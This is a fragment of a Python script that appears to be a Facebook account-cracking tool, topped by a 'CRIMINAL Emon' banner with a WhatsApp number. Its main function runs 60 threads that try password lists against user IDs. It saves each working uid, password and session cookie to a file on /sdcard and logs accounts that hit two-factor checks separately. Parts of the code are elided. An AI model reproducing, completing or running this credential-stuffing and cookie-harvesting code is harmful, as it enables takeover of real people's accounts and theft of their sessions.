...
#---------------END--------------#
logo=("""  \33[1;91m
\033[1;32m❴●\033[1;31m═━═━═━═━═━━═━═━═\033[34;1m❴𝐂𝐑𝐈𝐌𝐈𝐍𝐀𝐋 𝔼𝕞𝕠𝕟❵\033[1;31m═━═━═━━═━═━═━═\033[1;32m●❵
  \33[1;32m 
\33[1;32m .----------------.  .----------------.  .----------------.  .-----------------.
\33[1;32m| .--------------. || .--------------. || .--------------. || .--------------. |
\33[1;32m| |  _________   | || | ____    ____ | || |     ____     | || | ____  _____  | |
\33[1;32m| | |_   ___  |  | || ||_   \  /   _|| || |   .'    `.   | || ||_   \|_   _| | |
\33[1;32m| |   | |_  \_|  | || |  |   \/   |  | || |  /  .--.  \  | || |  |   \ | |   | |
\33[1;32m| |   |  _|  _   | || |  | |\  /| |  | || |  | |    | |  | || |  | |\ \| |   | |
\33[1;32m| |  _| |___/ |  | || | _| |_\/_| |_ | || |  \  `--'  /  | || | _| |_\   |_  | |
\33[1;32m| | |_________|  | || ||_____||_____|| || |   `.____.'   | || ||_____|\____| | |
\33[1;32m| |              | || |              | || |              | || |              | |
\33[1;32m| '--------------' || '--------------' || '--------------' || '--------------' |
\33[1;32m '----------------'  '----------------'  '----------------'  '----------------' 
...
\033[1;32m❴●\033[1;31m═━═━═━═━═━━═━═━═\033[34;1m❴𝐂𝐑𝐈𝐌𝐈𝐍𝐀𝐋 𝔼𝕞𝕠𝕟❵\033[1;31m═━═━═━━═━═━═━═\033[1;32m●❵
\33[1;32m┌════════════════════════════════════════════════┐
         \033[1;31m 𝐍𝐀𝐌𝐄: 𝐂𝐘𝐁 - 𝐂𝐑𝐈𝐌𝐈𝐍𝐀𝐋 - 𝔼𝕞𝕠𝕟
\33[1;32m└════════════════════════════════════════════════┘
\33[1;32m┌════════════════════════════════════════════════┐
           \033[1;31m 𝐌𝐘 - 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩: 01618752178
\33[1;32m└════════════════════════════════════════════════┘
\33[1;32m┌════════════════════════════════════════════════┐
...
def MORAD():    
    ...
    with ThreadPool(max_workers=60) as MORAD:
        ...
        print("\x1b[38;5;155m❴●═━═━═━═━═━━═━═━═❴𝐂𝐑𝐈𝐌𝐈𝐍𝐀𝐋 𝔼𝕞𝕠𝕟❵═━═━═━━═━═━═━═●❵\n")
        for guru in user:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/𝔼𝕞𝕠𝕟-𝙰𝙲𝚃𝙸𝚅𝙴😍💚.txt', 'a').write(uid+' • '+ps+' • ''[COOKIE]'  +coki+' \n')
                oks.append(uid)
                break
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    print('\r\033[38;5;45m[𝔼𝕞𝕠𝕟-2𝙵] '+uid+' [💙] '+ps+' ')
                    open('/sdcard/𝔼𝕞𝕠𝕟-2𝙵💙.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
